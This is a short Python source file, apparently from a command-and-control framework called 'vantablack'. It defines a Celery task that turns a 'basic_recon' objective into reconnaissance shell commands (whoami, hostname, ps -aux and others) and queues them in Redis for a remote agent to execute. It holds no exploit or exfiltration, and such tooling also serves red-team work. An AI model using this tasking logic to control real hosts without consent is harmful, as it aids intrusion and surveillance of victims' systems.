from core.event_bus import app, publish_event
from core.config import settings
import logging
import json
import redis

logger = logging.getLogger("ObjectiveWorker")

# This would eventually be a complex system mapping objectives to task chains
OBJECTIVE_TEMPLATES = {
    "basic_recon": [
        "whoami",
        "hostname",
        "pwd",
        "ls -la",
        "ps -aux"
    ]
}

@app.task(name='vantablack.objectives.execute_objective')
def execute_objective(agent_id: str, objective: str):
    """
    Decomposes an objective into a series of tasks and queues them for an agent.
    """
    logger.info(f"[OBJECTIVE] Starting objective '{objective}' for agent {agent_id}")

    commands = OBJECTIVE_TEMPLATES.get(objective)
    if not commands:
        logger.error(f"[OBJECTIVE] Unknown objective: {objective}")
        return

    # We need to access Redis directly to queue tasks, so we create a client.
    # In a real app, this would be better handled.
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)

    for command in commands:
        task_id = f"task_obj_{command.replace(' ', '_')}"
        task_data = {"id": task_id, "command": command}
        redis_client.lpush(f"c2:tasks:{agent_id}", json.dumps(task_data))
        logger.info(f"[OBJECTIVE] Queued command '{command}' for agent {agent_id}")

# To run this worker:
# celery -A workers.objective_worker worker --loglevel=info
